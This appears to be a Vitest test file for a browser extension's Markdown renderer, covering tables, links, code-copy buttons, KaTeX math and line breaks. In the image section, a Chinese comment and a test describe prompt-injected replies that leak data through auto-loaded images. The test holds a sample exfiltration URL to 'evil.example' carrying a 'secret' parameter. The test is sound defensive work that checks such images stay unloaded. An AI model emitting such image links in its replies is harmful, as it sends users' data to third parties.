// entrypoints/sidepanel/Markdown.test.tsx
import type { ReactElement } from 'react';
import { describe, expect, it, vi } from 'vitest';
import { fireEvent, render as rtlRender, screen, waitFor } from '@testing-library/react';
import { LocaleProvider } from '@/lib/i18n';
import Markdown from './Markdown';

const render = (ui: ReactElement) => rtlRender(<LocaleProvider>{ui}</LocaleProvider>);

const TABLE = ['| a | b |', '| --- | --- |', '| 1 | 2 |'].join('\n');

describe('Markdown table rendering', () => {
  it('wraps tables in a horizontally scrollable container', () => {
    const { container } = render(<Markdown content={TABLE} />);
    const table = container.querySelector('table');
    expect(table).not.toBeNull();
    expect(table?.parentElement).toHaveClass('md-table-wrap');
  });

  it('keeps the table contents intact through the wrapper', () => {
    const { container } = render(<Markdown content={TABLE} />);
    expect(container.querySelectorAll('th')).toHaveLength(2);
    expect(container.querySelectorAll('td')).toHaveLength(2);
  });

  it('does not wrap non-table content', () => {
    const { container } = render(<Markdown content={'普通段落\n\n- 一项\n- 两项'} />);
    expect(container.querySelector('.md-table-wrap')).toBeNull();
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  it('still renders fenced code blocks with a language class', () => {
    const { container } = render(<Markdown content={'```css\na { color: red; }\n```'} />);
    const code = container.querySelector('pre code');
    expect(code?.className).toContain('css');
  });
});

describe('Markdown link rendering', () => {
  it('opens reply links outside the extension side panel', () => {
    render(<Markdown content={'[Chrome 文档](https://developer.chrome.com/docs/extensions/)'} />);

    expect(screen.getByRole('link', { name: 'Chrome 文档' })).toHaveAttribute('target', '_blank');
  });
});

describe('Markdown image rendering', () => {
  // 回答可能受提示注入操纵：<img> 一渲染就会把 URL 里的数据发给第三方，所以不能自动加载
  it('never renders an <img> for remote images, only a link the user can click', () => {
    const { container } = render(<Markdown content={'![截图](https://evil.example/x.png?d=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = container.querySelector('a.md-image-placeholder');
    expect(link).toHaveAttribute('href', 'https://evil.example/x.png?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link?.textContent).toContain('evil.example');
    expect(link?.textContent).toContain('截图');
  });

  it('renders plain text for images without an http(s) URL', () => {
    const { container } = render(<Markdown content={'![图](./local.png)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a.md-image-placeholder')).toBeNull();
    expect(container.querySelector('.md-image-placeholder')).not.toBeNull();
  });
});

describe('Markdown code block copy button', () => {
  it('copies only the code of that block', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
    const { container } = render(<Markdown content={'说明\n\n```css\n.nav { top: 0; }\n```'} />);
    const button = container.querySelector('.md-pre-wrap button.md-copy-code') as HTMLButtonElement;
    expect(button).not.toBeNull();
    fireEvent.click(button);
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('.nav { top: 0; }'));
  });
});

describe('Markdown math rendering', () => {
  it('renders inline and display formulas with KaTeX', () => {
    const { container } = render(<Markdown content={'质能方程 $E=mc^2$\n\n$$\n\\frac{a}{b}\n$$'} />);
    expect(container.querySelectorAll('.katex')).toHaveLength(2);
    expect(container.querySelectorAll('.katex-display')).toHaveLength(1);
  });

  it('renders LaTeX-style \\( \\) delimiters', () => {
    const { container } = render(<Markdown content={'其中 \\(x^2\\) 为平方'} />);
    expect(container.querySelector('.katex')).not.toBeNull();
  });

  it('keeps currency amounts as plain text', () => {
    const { container } = render(<Markdown content={'价格从 $5 到 $10 不等'} />);
    expect(container.querySelector('.katex')).toBeNull();
    expect(container.textContent).toBe('价格从 $5 到 $10 不等');
  });
});

describe('Markdown soft line break rendering', () => {
  // 划词翻译/润色场景：选中文本常是单换行分隔的多行/多段（selection.toString()
  // 不会插入空行），CommonMark 默认把段内单换行当空格处理，不加 remark-breaks
  // 会把这些行挤成一段话，丢失原文的换行/段落结构。
  it('renders a single newline within a paragraph as a line break', () => {
    const { container } = render(<Markdown content={'第一行\n第二行\n第三行'} />);
    const paragraph = container.querySelector('p');
    expect(paragraph).not.toBeNull();
    expect(paragraph?.querySelectorAll('br')).toHaveLength(2);
    expect(paragraph?.textContent).toBe('第一行\n第二行\n第三行');
  });
});
